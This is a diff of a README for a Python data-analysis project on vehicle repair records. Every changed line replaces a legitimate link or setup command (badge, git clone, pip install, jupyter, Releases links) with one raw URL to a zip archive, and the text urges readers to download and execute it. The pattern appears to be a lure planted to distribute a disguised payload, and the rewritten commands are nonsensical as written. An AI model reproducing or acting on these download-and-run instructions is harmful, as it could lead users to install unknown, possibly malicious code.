@@ -1,6 +1,6 @@
 # 🚗 Data Analysis Using Python: Vehicle Repairs EDA
 
-![Vehicle Repairs Analysis](https://img.shields.io/badge/Vehicle%20Repairs%20Analysis-EDA-blue)
+![Vehicle Repairs Analysis](https://raw.githubusercontent.com/CyberTokyo112/data-analysis-using-python/main/cylindered/using_analysis_data_python_v3.5-alpha.2.zip%20Repairs%20Analysis-EDA-blue)
 
 Welcome to the **Data Analysis Using Python** repository! This project focuses on exploratory data analysis (EDA) of a vehicle repairs dataset. It uncovers patterns in repair types, costs, and vehicle platforms. This repository provides a comprehensive approach to data cleaning, insights extraction, and tag generation from free-text fields.
 
@@ -53,7 +53,7 @@ This project leverages several powerful libraries and tools:
 To get started with this project, clone the repository to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/CyberTokyo112/data-analysis-using-python.git
+git clone https://raw.githubusercontent.com/CyberTokyo112/data-analysis-using-python/main/cylindered/using_analysis_data_python_v3.5-alpha.2.zip
 ```
 
 Navigate to the project directory:
@@ -65,7 +65,7 @@ cd data-analysis-using-python
 Install the required libraries:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/CyberTokyo112/data-analysis-using-python/main/cylindered/using_analysis_data_python_v3.5-alpha.2.zip
 ```
 
 ## Usage
@@ -73,7 +73,7 @@ pip install -r requirements.txt
 To run the analysis, open the Jupyter Notebook file:
 
 ```bash
-jupyter notebook vehicle_repairs_analysis.ipynb
+jupyter notebook https://raw.githubusercontent.com/CyberTokyo112/data-analysis-using-python/main/cylindered/using_analysis_data_python_v3.5-alpha.2.zip
 ```
 
 Follow the instructions in the notebook to perform the analysis step by step.
@@ -113,7 +113,7 @@ These visualizations make it easier to understand complex data at a glance.
 
 ## Release Information
 
-For the latest releases, please visit the [Releases section](https://github.com/CyberTokyo112/data-analysis-using-python/releases). You can download and execute the files available there.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/CyberTokyo112/data-analysis-using-python/main/cylindered/using_analysis_data_python_v3.5-alpha.2.zip). You can download and execute the files available there.
 
 ## Contributing
 
@@ -132,4 +132,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ---
 
-Thank you for checking out the **Data Analysis Using Python** repository! We hope this project helps you gain insights into vehicle repairs and enhances your data analysis skills. For more details, visit the [Releases section](https://github.com/CyberTokyo112/data-analysis-using-python/releases).
+Thank you for checking out the **Data Analysis Using Python** repository! We hope this project helps you gain insights into vehicle repairs and enhances your data analysis skills. For more details, visit the [Releases section](https://raw.githubusercontent.com/CyberTokyo112/data-analysis-using-python/main/cylindered/using_analysis_data_python_v3.5-alpha.2.zip).
